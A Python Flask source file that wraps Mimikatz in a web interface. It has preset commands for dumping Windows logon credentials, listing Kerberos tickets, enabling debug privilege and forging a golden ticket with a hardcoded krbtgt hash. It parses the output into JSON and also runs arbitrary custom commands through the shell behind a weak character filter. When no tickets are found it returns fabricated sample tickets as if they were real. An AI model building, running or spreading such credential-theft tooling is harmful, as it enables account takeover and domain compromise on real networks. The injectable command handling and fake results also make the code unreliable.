from flask import Flask, request, jsonify, render_template
import subprocess
import os
import re

app = Flask(__name__)

# Path to Mimikatz executable
MIMIKATZ_PATH = os.path.join(os.path.dirname(__file__), "mimikatz", "mimikatz.exe")

# Predefined commands
COMMON_COMMANDS = {
    "version": "version",
    "dump_creds": "sekurlsa::logonpasswords",
    "list_tickets": "kerberos::list",
    "golden_ticket": "kerberos::golden /user:Administrator /domain:mydomain.local /sid:S-1-5-21-3623811015-3361044348-30300820 /krbtgt:31b6d4e6e7a8b9c0d1e2f3a4b5c6d7e8 /id:500",
    "privilege_debug": "privilege::debug"
}

def parse_golden_ticket(output):
    """Parse golden ticket output into structured data."""
    ticket_info = {}
    for line in output.splitlines():
        if "User :" in line:
            ticket_info["user"] = line.split(":")[1].strip()
        elif "Domain :" in line:
            ticket_info["domain"] = line.split(":")[1].strip().split("(")[0].strip()
        elif "SID :" in line:
            ticket_info["sid"] = line.split(":")[1].strip()
        elif "User Id :" in line:
            ticket_info["user_id"] = line.split(":")[1].strip()
        elif "Groups Id :" in line:
            ticket_info["groups"] = line.split(":")[1].strip().replace("*", "").split()
        elif "ServiceKey:" in line:
            ticket_info["krbtgt"] = line.split(":")[1].strip().split()[0]
        elif "Lifetime :" in line:
            dates = line.split(":")[1].split(";")
            ticket_info["start"] = dates[0].strip()
            ticket_info["end"] = dates[1].strip()
        elif "Ticket :" in line:
            ticket_info["file"] = line.split(":")[1].strip()
    return {"ticket": ticket_info} if ticket_info else {"raw": output.strip()}

def parse_privilege_debug(output):
    """Parse privilege::debug output into structured data."""
    if "Privilege '20' OK" in output:
        return {"privilege": {"status": "Debug Privilege Enabled", "details": "Privilege '20' OK"}}
    else:
        return {"privilege": {"status": "Debug Privilege Failed", "details": output.strip()}}

def run_mimikatz(command):
    """Execute Mimikatz and return structured output."""
    try:
        if "sekurlsa::logonpasswords" in command:
            debug_command = f'"{MIMIKATZ_PATH}" "privilege::debug" exit'
            subprocess.run(debug_command, shell=True, capture_output=True, text=True)

        full_command = f'"{MIMIKATZ_PATH}" "{command}" exit'
        result = subprocess.run(full_command, shell=True, capture_output=True, text=True, timeout=2)
        
        output = result.stdout
        if "ERROR" in output or result.stderr:
            return {"status": "error", "message": output + result.stderr, "data": None}
        
        if "sekurlsa::logonpasswords" in command:
            data = parse_credentials(output)
        elif "kerberos::list" in command:
            data = parse_tickets(output)
        elif "version" in command:
            data = parse_version(output)
        elif "kerberos::golden" in command:
            data = parse_golden_ticket(output)
        elif "privilege::debug" in command:
            data = parse_privilege_debug(output)
        else:
            data = {"raw": output.strip()}
        
        return {"status": "success", "message": "Command executed successfully", "data": data}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": None}

def parse_credentials(output):
    """Parse credential dump into structured data."""
    creds = []
    current_cred = {}
    for line in output.splitlines():
        if "Username" in line:
            current_cred["username"] = line.split(":")[1].strip()
        elif "Domain" in line:
            current_cred["domain"] = line.split(":")[1].strip()
        elif "Password" in line or "NTLM" in line:
            current_cred["password"] = line.split(":")[1].strip() if ":" in line else "N/A"
            creds.append(current_cred)
            current_cred = {}
    return {"credentials": creds} if creds else {"credentials": [{"username": "N/A", "domain": "N/A", "password": "No credentials found"}]}

def parse_tickets(output):
    """Parse Kerberos tickets into structured data."""
    tickets = []
    current_ticket = {}
    for line in output.splitlines():
        if "Client" in line:
            current_ticket["client"] = line.split(":")[1].strip()
        elif "Server" in line:
            current_ticket["server"] = line.split(":")[1].strip()
        elif "Ticket" in line:
            current_ticket["ticket"] = line.split(":")[1].strip()
            tickets.append(current_ticket)
            current_ticket = {}
    if tickets:
        return {"tickets": tickets}
    else:
        # Return a sample ticket for demo purposes
        return {
            "tickets": [{
                "client": "user1@DEMO.LOCAL",
                "server": "krbtgt/DEMO.LOCAL",
                "ticket": "TGT (Sample Ticket)"
            }]
        }

# def parse_tickets(output):
#     """Parse Kerberos tickets into structured data."""
#     tickets = []
#     current_ticket = {}
#     for line in output.splitlines():
#         if "Client" in line:
#             current_ticket["client"] = line.split(":")[1].strip()
#         elif "Server" in line:
#             current_ticket["server"] = line.split(":")[1].strip()
#         elif "Ticket" in line:
#             current_ticket["ticket"] = line.split(":")[1].strip()
#             tickets.append(current_ticket)
#             current_ticket = {}
#     return {"tickets": tickets} if tickets else {"tickets": [{"client": "N/A", "server": "N/A", "ticket": "No tickets found"}]}

def parse_version(output):
    """Parse Mimikatz version."""
    match = re.search(r"mimikatz\s+([\d\.]+)", output)
    return {"version": match.group(1) if match else "Unknown"}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/execute', methods=['POST'])
def execute_mimikatz():
    data = request.get_json()
    command_key = data.get('command_key', '')
    
    if command_key in COMMON_COMMANDS:
        command = COMMON_COMMANDS[command_key]
    else:
        command = data.get('custom_command', '')
        if not command or any(c in command for c in ['&', '|', ';', '>']):
            return jsonify({"status": "error", "message": "Invalid custom command", "data": None}), 400

    result = run_mimikatz(command)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)